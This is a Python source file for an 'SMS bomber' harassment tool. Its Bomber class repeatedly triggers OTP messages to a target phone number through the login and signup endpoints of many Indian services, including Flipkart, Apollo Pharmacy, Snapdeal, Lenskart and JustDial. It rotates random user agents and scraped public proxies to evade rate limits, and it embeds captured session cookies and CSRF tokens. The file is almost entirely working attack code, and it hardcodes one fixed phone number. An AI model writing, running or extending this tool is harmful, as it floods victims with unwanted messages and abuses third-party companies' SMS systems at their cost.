import json
import random
import requests


class Bomber:

    def __init__(self, user_mobile, number_of_messege):
        self.user_mobile = user_mobile
        self.number_of_messege = number_of_messege
        self.acceptlanguage = "en-GB,en-US;q=0.9,en;q=0.8"

    def getUserAgent(self):
        with open('useragent.json') as f:
            data = json.load(f)
            user_agent_list = data["user_agent"]
        userAgent = random.choice(user_agent_list)
        return userAgent

    def _checkinternet(self):
        try:
            requests.get("https://www.google.com")
            return True
        except:
            print("Check your internet connection and the modules")
            return False

    def getproxy(self):
        proxy_scrape_url = "https://api.proxyscrape.com/?request=getproxies&proxytype=http&timeout=10000&country=all"
        try:
            proxy_request = requests.get(proxy_scrape_url, Timeout=10)
        except:
            return False
        proxylist = proxy_request.text.split()
        return 'https://' + random.choice(proxylist)

    def flipkart(self):
        url = "https://rome.api.flipkart.com/api/7/user/otp/generate"
        flipkart_header = {
            "Accept": "*/*",
            "Accept-Encoding": "gzip, deflate, br",
            "Accept-Language": self.acceptlanguage,
            "Connection": "keep-alive",
            "Content-Length": "53",
            "Content-Type": "application/json",
            "DNT": "1",
            "Host": "rome.api.flipkart.com",
            "Origin": "https://www.flipkart.com",
            "Referer": "https://www.flipkart.com/",
            "Sec-Fetch-Dest": "empty",
            "Sec-Fetch-Mode": "cors",
            "Sec-Fetch-Site": "same-site",
            "User-Agent": self.getUserAgent(),
            "X-user-agent": self.getUserAgent() + " FKUA/website/42/website/Desktop"
        }
        try:
            request = requests.post(url, data=json.dumps(
                {"loginId": "+91" + self.user_mobile}), headers=flipkart_header, proxies={'https': self.getproxy()})
        except:
            return False
        if(request.status_code == 200):
            return True

    def confirmtkt(self):
        url = "https://securedapi.confirmtkt.com/api/platform/registerOutput?mobileNumber=" + \
            self.user_mobile + "&newOtp=true"
        confirmtkt_header = {
            'authority': "securedapi.confirmtkt.com",
            'accept': "*/*",
            'accept-language': "en-US,en;q=0.9",
            'dnt': "1",
            'origin': "https://www.confirmtkt.com",
            'referer': "https://www.confirmtkt.com/",
            'sec-ch-ua': "^\^"
        }
        try:
            request = requests.get(url, headers=confirmtkt_header, proxies={
                                   'https': self.getproxy()})
        except:
            return False
        if(request.status_code == 200):
            return True

    def apolopharmacy(self):
        url = "https://www.apollopharmacy.in/sociallogin/mobile/sendotp"
        apolopharmacy_header = {
            "accept": "*/*",
            "accept-encoding": "gzip, deflate, br",
            "accept-language": self.acceptlanguage,
            "Connection": "keep-alive",
            "content-length": "17",
            "content-type": "application/x-www-form-urlencoded; charset=UTF-8",
            "dnt": "1",
            "origin": "https://www.apollopharmacy.in",
            "referer": "https://www.apollopharmacy.in/",
            "sec-fetch-dest": "empty",
            "sec-fetch-mode": "cors",
            "sec-fetch-site": "same-origin",
            "user-agent": self.getUserAgent(),
            "x-requested-with": "XMLHttpRequest",
        }
        try:
            request = requests.post(url, data="mobile=" + self.user_mobile,
                                    headers=apolopharmacy_header, proxies={'https': self.getproxy()})
        except:
            return False
        if (request.status_code == 200):
            return True

    def ajio(self):
        url = "https://login.web.ajio.com/api/auth/generateLoginOTP"
        ajio_header = {
            "accept": "application/json     ",
            "accept-encoding": "gzip, deflate, br",
            "accept-language": self.acceptlanguage,
            "Connection": "keep-alive",
            "content-length": "29",
            "content-type": "application/json",
            "Host": "login.web.ajio.com",
            "dnt": "1",
            "origin": "https://www.ajio.com",
            "referer": "https://www.ajio.com/",
            "sec-fetch-dest": "empty",
            "sec-fetch-mode": "cors",
            "sec-fetch-site": "same-site",
            "user-agent": self.getUserAgent()
        }
        try:
            request = requests.post(url, data=json.dumps(
                {"mobileNumber": self.user_mobile}), headers=ajio_header, proxies={'https': self.getproxy()})
        except:
            return False
        if (request.json()['success']):
            return True
        return False

    def unacademy(self):
        url = "https://unacademy.com/api/v1/user/get_app_link/"
        unac_header = {
            "accept": "application/json",
            "accept-encoding": "gzip, deflate, br",
            "accept-language": self.acceptlanguage,
            "Connection": "keep-alive",
            "content-length": "107",
            "content-type": "application/json",
            "dnt": "1",
            "origin": "https://unacademy.com",
            "referer": "https://unacademy.com",
            "sec-fetch-dest": "empty",
            "sec-fetch-mode": "cors",
            "sec-fetch-site": "same-origin",
            "user-agent": self.getUserAgent()
        }
        try:
            request = requests.post(url, data=json.dumps(
                {"phone": self.user_mobile}), headers=unac_header, proxies={'https': self.getproxy()})
        except:
            return False
        if(request.status_code == 200):
            return True

    def snapdeal(self):
        url = "https://www.snapdeal.com/sendOTP"
        snapdeal_head = {
            "accept": "*/*",
            "accept-encoding": "gzip, deflate, br",
            "accept-language": "en-GB,en-US;q=0.9,en;q=0.8",
            "content-length": "62",
            "content-type": "application/x-www-form-urlencoded",
            "DNT": "1",
            "Host": "www.snapdeal.com",
            "origin": "https://www.snapdeal.com",
            "referer": "https://www.snapdeal.com/iframeLogin",
            "sec-fetch-dest": "empty",
            "sec-fetch-mode": "cors",
            "sec-fetch-site": "same-origin",
            "user-agent": self.getUserAgent(),
            "X-Requested-With": "XMLHttpRequest"
        }
        try:
            request = requests.post(url, data="emailId=&mobileNumber=" + self.user_mobile +
                                    "&purpose=LOGIN_WITH_MOBILE_OTP", headers=snapdeal_head, proxies={'https': self.getproxy()})
        except:
            return False
        if (request.json()['status'] == "fail"):
            return False
        return True

    def jiomart(self):
        url = "https://www.jiomart.com/mst/rest/v1/id/details/" + self.user_mobile
        jiomart_header = {
            "accept": "application/json, text/plain,*/*",
            "accept-encoding": "gzip, deflate, br",
            "accept-language": "en-GB,en-US;q=0.9,en;q=0.8",
            "dnt": "1",
            "sec-fetch-dest": "empty",
            "sec-fetch-mode": "cors",
            "sec-fetch-site": "same-origin",
            "user-agent": self.getUserAgent(),
            "referer": "https://www.jiomart.com/customer/account/login"
        }
        try:
            request = requests.get(url, headers=jiomart_header, proxies={
                                   'https': self.getproxy()})
        except:
            return False
        if(request.status_code == 400):
            return True

    def upchar(self):
        url = "https://www.myupchar.com/registrations/store_otp"
        payload = "{\"phone\": "f'"{self.user_mobile}"'",\"name\":\"wdwd\",\"email\":\"dwwddw@dw.sd\",\"source\":\"web-UserRegistration-devise\"}"
        headers = {
            'cookie': "_ga=GA1.1.1901629367.1654419587; utm_refrer_myupchar=https%3A%2F%2Fwww.myupchar.com%2F; _marketplace_session=U2c0MUhTaC9VNEo5akNOSUlyNGZQVDNlWlpoQWt4eWY3ZFVKQkJSNSsxVDZqaUpmc1pWQTJDNmhEWmJxZHgxV25UaE12QThwdWdxMXpHd2VCc1lMK2cxWEdWdk1tbGNoUHdWTXA1RHZZdWpab3ZnTVJWSEpPbTFaRU5JWWppenNjWE9Ea1ZoOG51SmFZTFZKUm01OG5PU0p5K3MreU90WnBzUlU5WVVEK2FYTkxNNUh5bXJ6elBTdGxMdGlZWmtJQjBWelNjN0VCdUc0QlpTQkp6djlDQ2o5emlzdDNjcjFIQS8zQkR3ZXBrMEc4MUY3eFkyL2FNUWZwbmVVbUoyNEIremF0NWF2RG9jaHJOMzh0dVNqekE9PS0tbFRyUXR3SVZaVjdMbWtOZjIzWkdMUT09--ae368d251555a7c93c6cf75551ce755a120cbb56; _ga_RDVJWEGGPJ=GS1.1.1654419587.1.1.1654419588.0",
            'authority': "www.myupchar.com",
            'accept': "*/*",
            'accept-language': "en-US,en;q=0.9",
            'cache-control': "max-age=0",
            'content-type': "application/json",
            'dnt': "1",
            'origin': "https://www.myupchar.com",
            'sec-fetch-dest': "empty",
            'sec-fetch-mode': "cors",
            'sec-fetch-site': "same-origin",
            "user-agent": self.getUserAgent(),
            'x-csrf-token': "zMq4ZeAFqYtvgHrdXOp6xYrdQQjigTjugFrAD0uZSbU="
        }
        try:
            request = requests.request("POST", url, data=payload, headers=headers, proxies={
                'https': self.getproxy()})
        except:
            return False
        if(request.status_code == 400):
            return True

    def tata(self):
        url = "https://myaccount.tatatel.co.in:4443/EBSSelfCare/LoginAction.do"
        querystring = {"methodToCall": "validateOTPDetails",
                       "identifier": "resend"}

        payload = f"methodToCall=&firstLogin=true&unregisterEmail=dwwddw%2540dw.sd&unregisterMobile={self.user_mobile}&userStatus=SUCCESS&emailIdPin=4558&mobileNoPin=1023&emailId=dwwddw%2540dw.sd&emailId=3223232323&emailOTP=&mobileOTP="
        headers = {
            'cookie': "JSESSIONID=9453deeefb1777922160b15caf30c5ce2b8abf9a8a9a8e5252a8e46587375b87",
            'Accept': "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
            'Accept-Language': "en-US,en;q=0.9",
            'Cache-Control': "max-age=0",
            'Connection': "keep-alive",
            'Content-Type': "application/x-www-form-urlencoded",
            'DNT': "1",
            'Origin': "https://myaccount.tatatel.co.in:4443",
            'Referer': "https://myaccount.tatatel.co.in:4443/EBSSelfCare/LoginAction.do?methodToCall=loginUnregisterUser&emailId=dwwddw@dw.sd&mobileNo=3223232323",
            'Sec-Fetch-Dest': "iframe",
            'Sec-Fetch-Mode': "navigate",
            'Sec-Fetch-Site': "same-origin",
            'Sec-Fetch-User': "?1",
            'Upgrade-Insecure-Requests': "1",
            "user-agent": self.getUserAgent(),
        }
        try:
            request = requests.request("POST", url, data=payload, headers=headers, params=querystring, proxies={
                                       'https': self.getproxy()})
        except:
            return False
        if(request.status_code == 400):
            return True

    def snapdeal(self):
        url = "https://www.snapdeal.com/signupAjax"
        payload = "{\"j_number\":"f"{self.user_mobile}"",\"j_username\":\"qw89ibiqs@gmail.com\",\"j_name\":\"dwwdwddwwd\",\"j_dob\":\"05/06/1997\",\"j_password\":\"ibhwdwj278@dw\",\"j_confpassword\":\"ibhwdwj278@dw\",\"CSRFToken\":\"c721707c510b297e116bde2d713eb73aa88225b8\",\"targetUrl\":\"\",\"mobileStart\":\"true\",\"numberEdit\":\"true\",\"socialid\":\"\",\"gender\":\"\",\"j_displayname\":\"\",\"language\":\"\",\"source\":\"\",\"lastname\":\"\",\"firstname\":\"\"}"
        headers = {'Accept': "application/json, text/javascript, */*; q=0.01",
                   'Accept-Language': "en-US,en;q=0.9",
                   'Connection': "keep-alive",
                   'Content-Type': "application/json;charset=UTF-8",
                   'Cookie': "versm=v1; deviceos=""; alps=akm; _gcl_au=1.1.1020611895.1654409383; isWebP=true; st=utm_source%3DSEO%7Cutm_content%3Dnull%7Cutm_medium%3Dnull%7Cutm_campaign%3Dnull%7Cref%3Dnull%7Cutm_term%3Dnull%7Caff_id%3Dnull%7Caff_sub%3Dnull%7Caff_sub2%3Dnull%7C; vt=utm_source%3DSEO%7Cutm_content%3Dnull%7Cutm_medium%3Dnull%7Cutm_campaign%3Dnull%7Cref%3Dnull%7Cutm_term%3Dnull%7Caff_id%3Dnull%7Caff_sub%3Dnull%7Caff_sub2%3Dnull%7C; lt=utm_source%3DSEO%7Cutm_content%3Dnull%7Cutm_medium%3Dnull%7Cutm_campaign%3Dnull%7Cref%3Dnull%7Cutm_term%3Dnull%7Caff_id%3Dnull%7Caff_sub%3Dnull%7Caff_sub2%3Dnull%7C; SCOUTER=x4atbgcio756h9; JSESSIONID=D6DF78305961CB35EA12ED4E1E1D7971; versn=v1; u=165440938341432113; sd.zone=Z5; xg=eyJ3YXAiOnsiYWUiOiIxIn0sInBzIjp7ImNiIjoiQyIsInVybCI6IloxIn0sInNjIjp7InNoaXBwaW5nX2ludGVydmFsIjoibWxfbmV3X3diIn0sInVpZCI6eyJndWlkIjoiZGNjOTdiYjMtMmEzZS00MzE2LThjYjgtYTliMDhkNzRhZDYxIn19fHwxNjU0NDExMTgzNDE4; xc=eyJ3YXAiOnsiYWUiOiIxIn0sInBzIjp7ImNiIjoiQyIsInVybCI6IloxIn0sInNjIjp7InNoaXBwaW5nX2ludGVydmFsIjoibWxfbmV3X3diIn19; _uetsid=17b2c850e49611eca9ab976308084d96; _uetvid=17b30470e49611ecb2a26be1361e9400; f5_cspm=1234; _sdDPPageId=1654409432153_1981_165440938341432113; s_sess=%20s_cc%3Dtrue%3B%20s_ppv%3D0%3B%20s_sq%3Djasper-snapdeal-prd%253D%252526pid%25253DiframeLogin%252526pidt%25253D1%252526oid%25253Djavascript%2525253Avoid(0)%2525253B%252526ot%25253DA%3B; Megatron=\u00213L4XTOFfb5oNivH+ZidaGBcQKxXOrIbCAYb56UdkfjW8QKQmUY8aO4+CYTV4eYJF0EfemOEMyz6cwJE=; s_pers=%20s_vnum%3D1657001384034%2526vn%253D1%7C1657001384034%3B%20gpv_pn%3DiframeLogin%7C1654411253729%3B%20s_invisit%3Dtrue%7C1654411253731%3B",
                   'DNT': "1",
                   'Origin': "https://www.snapdeal.com",
                   'Referer': "https://www.snapdeal.com/iframeLogin",
                   'Sec-Fetch-Dest': "empty",
                   'Sec-Fetch-Mode': "cors",
                   'Sec-Fetch-Site': "same-origin",
                   "user-agent": self.getUserAgent(),
                   'X-Requested-With': "XMLHttpRequest",
                   }
        try:
            request = requests.request("POST", url, data=payload, headers=headers, proxies={
                'https': self.getproxy()})
        except:
            return False
        if(request.status_code == 400):
            return True

    def pharmeasy(self):
        url = "https://pharmeasy.in/api/auth/requestOTP"
        payload = "{\"contactNumber\":"f'"{self.user_mobile}"'"}"
        headers = {
            'authority': "pharmeasy.in",
            'accept': "*/*",
            'accept-language': "en-US,en;q=0.9",
            'content-type': "application/json",
            'cookie': "HAB_Var=NE; HAB_XDI=3qFYtTgwN7LDL-66mgFPF; X-App-Version=2.1; X-Phone-Platform=mweb; X-Default-City=1; X-Pincode=400001; _gcl_au=1.1.1573276293.1654420672; _ga=GA1.1.1551407676.1654420673; XdI=0a7db77ff1bb906e96ea3514c87e084b; WZRK_G=8a9dfc10e4954f5eb0fcc3db78d2cb43; XPESS=active; XPESD={%22session_id%22:%22s_w_8a9dfc10e4954f5eb0fcc3db78d2cb43_1654420674000%22%2C%22session_id_flag%22:%22ct_id%22%2C%22referrer%22:%22%22%2C%22session_start_time%22:%222022-06-05T09:17:54.650Z%22}; X-IP=103.206.138.95%2C%2010.46.9.46%2C%2023.46.9.94%2C%20104.91.59.239; _uetsid=60e7e680e4b011eca29e3353d558f5e2; _uetvid=60e82260e4b011eca46a31f5625fd13d; _ga_J4XE9SW84F=GS1.1.1654420673.1.1.1654420685.48; WZRK_S_R9Z-WWR-854Z=%7B%22p%22%3A3%2C%22s%22%3A1654420674%2C%22t%22%3A1654420694%7D; pe_last_active=Sun%20Jun%2005%202022%2014:48:16%20GMT+0530%20(India%20Standard%20Time)",
            'dnt': "1",
            'origin': "https://pharmeasy.in",
            'referer': "https://pharmeasy.in/?redirect=/online-medicine-order?src=homecard",
            'sec-fetch-dest': "empty",
            'sec-fetch-mode': "cors",
            'sec-fetch-site': "same-origin",
            "user-agent": self.getUserAgent(),
            'x-ff': "",
            'x-phone-platform': "web",
            'x-real-ip': "",
            'x-ua': ""
        }
        try:
            request = requests.request("POST", url, data=payload, headers=headers, proxies={
                'https': self.getproxy()})
        except:
            return False
        if(request.status_code == 400):
            return True

    def okcredit(self):
        url = "https://web.okcredit.in/api/authn/v1.0/otp:request"
        payload = "{\"mobile\":"f"{self.user_mobile}"",\"mode\":0}"
        headers = {
            'authority': "web.okcredit.in",
            'accept': "*/*",
            'accept-language': "en-US,en;q=0.9",
            'content-type': "application/json",
            'cookie': "_gcl_au=1.1.1607132112.1654417832; i18next=en",
            'dnt': "1",
            'newrelic': "eyJ2IjpbMCwxXSwiZCI6eyJ0eSI6IkJyb3dzZXIiLCJhYyI6IjI0MTE2MTMiLCJhcCI6IjkyNzMyODEwOCIsImlkIjoiODg4NWU1M2FjZWQxOGFjMCIsInRyIjoiOGU3NWM1ZGVmM2YzNDIzZWY0ZjFmOGM1NGQzYWVmZTAiLCJ0aSI6MTY1NDQxNzg1MDI2MH19",
            'origin': "https://web.okcredit.in",
            'referer': "https://web.okcredit.in/login",
            'sec-fetch-dest': "empty",
            'sec-fetch-mode': "cors",
            'sec-fetch-site': "same-origin",
            'traceparent': "00-8e75c5def3f3423ef4f1f8c54d3aefe0-8885e53aced18ac0-01",
            'tracestate': "2411613@nr=0-1-2411613-927328108-8885e53aced18ac0----1654417850260",
            'user-agent': "Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.5005.63 Mobile Safari/537.36 Edg/102.0.1245.30"
        }
        try:
            request = requests.request("POST", url, data=payload, headers=headers, proxies={
                'https': self.getproxy()})
        except:
            return False
        if(request.status_code == 400):
            return True

    def naaptol(self):
        url = "https://www.naaptol.com/faces/jsp/ajax/ajax.jsp"
        payload = f"actionname=checkMobileUserExistsForTvApp&mobile={self.user_mobile}"
        headers = {
            'cookie': "NT-vfc=6WjUX5MjAyM1o%3DM",
            'Accept': "application/json, text/javascript, */*; q=0.01",
            'Accept-Language': "en-US,en;q=0.9",
            'Connection': "keep-alive",
            'Content-Type': "application/x-www-form-urlencoded; charset=UTF-8",
            'Cookie': "JSESSIONID=server3_cookie~520410CE48224C9925359FDD1724C891.frontend_node9; NT-language=1; CAMPAIGN_COOKIE=5-Organic-Org-Organic; _gcl_aw=GCL.1654417689.Cj0KCQjwqPGUBhDwARIsANNwjV7Ac_1BlCQePQwuQLzNGuVNstAHE1uNTaagpvncOpHb0A66hNpA88IaAtapEALw_wcB; _gcl_au=1.1.585766493.1654417689; _uetsid=6e9a06e0e4a911ec82dd39108d9bc91c; _uetvid=6e9a33d0e4a911ec889cf9f08c45f793",
            'DNT': "1",
            'Origin': "https://www.naaptol.com",
            'Referer': "https://www.naaptol.com/?utm_source=google&utm_medium=cpc&utm_campaign=RSA&gclid=Cj0KCQjwqPGUBhDwARIsANNwjV7Ac_1BlCQePQwuQLzNGuVNstAHE1uNTaagpvncOpHb0A66hNpA88IaAtapEALw_wcB",
            'Sec-Fetch-Dest': "empty",
            'Sec-Fetch-Mode': "cors",
            'Sec-Fetch-Site': "same-origin",
            "user-agent": self.getUserAgent(),
            'X-Requested-With': "XMLHttpRequest",
            'pageSecurityToken': "5VjE2NTQ0MTc2OD0U4OTdfbkBAcHRvbF83MjY1MTg1MkY=D",
        }
        try:
            request = requests.request("POST", url, data=payload, headers=headers, proxies={
                'https': self.getproxy()})
        except:
            return False
        if(request.status_code == 400):
            return True

    def lenskart(self):
        url = "https://api-gateway.juno.lenskart.com/v3/customers/sendOtp"

        payload = "{\"telephone\":"f'"{self.user_mobile}"'",\"captcha\":null,\"phoneCode\":\"+91\"}"
        headers = {'authority': "api-gateway.juno.lenskart.com",
                   'accept': "*/*",
                   'accept-language': "en-US,en;q=0.9",
                   'cache-control': "no-cache, no-store",
                   'content-type': "application/json",
                   'dnt': "1",
                   'origin': "https://www.lenskart.com",
                   'referer': "https://www.lenskart.com/",
                   'sec-fetch-mode': "cors",
                   'sec-fetch-site': "same-site",
                   "user-agent": self.getUserAgent(),
                   'x-accept-language': "en",
                   'x-api-client': "desktop",
                   'x-b3-traceid': "991654405662341",
                   'x-country-code': "in",
                   'x-session-token': "fc0a791f-5fb8-43c9-9af3-79a39dc77ca7"
                   }
        try:
            request = requests.request("POST", url, data=payload, headers=headers, proxies={
                'https': self.getproxy()})
        except:
            return False
        if(request.status_code == 400):
            return True

    def justdial(self):
        url = "https://www.justdial.com/functions/whatsappverification.php"

        payload = f"mob={self.user_mobile}&vcode=&rsend=0&name=wddwdw"
        headers = {
            'authority': "www.justdial.com",
            'accept': "*/*",
            'accept-language': "en-US,en;q=0.9",
            'content-type': "application/x-www-form-urlencoded; charset=UTF-8",
            'dnt': "1",
            'origin': "https://www.justdial.com",
            'referer': "https://www.justdial.com/",
            'sec-ch-ua-platform': "Android",
            'sec-fetch-dest': "empty",
            'sec-fetch-mode': "cors",
            'sec-fetch-site': "same-origin",
            'user-agent': "Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.5005.63 Mobile Safari/537.36",
            'x-frsc-token': "9838214a8d42cb7d4b9c943336c3c3801474f6a9ac56a6872508c66c1e2d45e6",
            'x-requested-with': "XMLHttpRequest"
        }
        try:
            request = requests.request("POST", url, data=payload, headers=headers, proxies={
                'https': self.getproxy()})
        except:
            return False
        if(request.status_code == 400):
            return True

    def jobhai(self):
        url = "https://api.jobhai.com/auth/jobseeker/v2/send_otp"
        monumber = 7984430992
        payload = "{\"phone\":"f"{monumber}""}"
        headers = {
            'authority': "api.jobhai.com",
            'accept': "application/json, text/plain, */*",
            'accept-language': "en-US,en;q=0.9",
            'content-type': "application/json;charset=UTF-8",
            'device-id': "9e63978f-2a29-4762-a316-0989dcfbb79c",
            'dnt': "1",
            'language': "en",
            'origin': "https://www.jobhai.com",
            'referer': "https://www.jobhai.com/",
            'sec-fetch-dest': "empty",
            'sec-fetch-mode': "cors",
            'sec-fetch-site': "same-site",
            'source': "WEB",
            "user-agent": self.getUserAgent(),
            'x-transaction-id': "JS-WEB-0a53af79-f33d-4e56-90b3-b9e4b107a522"
        }
        try:
            request = requests.request("POST", url, data=payload, headers=headers, proxies={
                'https': self.getproxy()})
        except:
            return False
        if(request.status_code == 400):
            return True

    def startBombing(self):
        if(self._checkinternet()):
            counter = 0
            while True:
                if self.flipkart():
                    counter += 1
                if self.confirmtkt():
                    counter += 1
                if self.lenskart():
                    counter += 1
                if self.justdial():
                    counter += 1
                if self.apolopharmacy():
                    counter += 1
                if self.apolopharmacy():
                    counter += 1
                if self.unacademy():
                    counter += 1
                if self.snapdeal():
                    counter += 1
                if self.jiomart():
                    counter += 1
                if self.upchar():
                    counter += 1
                if self.tata():
                    counter += 1
                if self.snapdeal():
                    counter += 1
                if self.pharmeasy():
                    counter += 1
                if self.okcredit():
                    counter += 1
                if self.naaptol():
                    counter += 1
                if self.lenskart():
                    counter += 1
                if self.justdial():
                    counter += 1
                if self.jobhai():
                    counter += 1
                if(counter >= self.number_of_messege):
                    break

            # ["flipkart","confirmtkt","lenskart","justdial","indialends","apolopharmacy","magicbrick","ajio","mylescars","unacademy","snapdeal", "jiomart"]:
        else:
            print("possible errors -  Internet connectivity")


# shiprocketsocial,valueshoppe,housing.com,hoststar,byju,altbalaji,
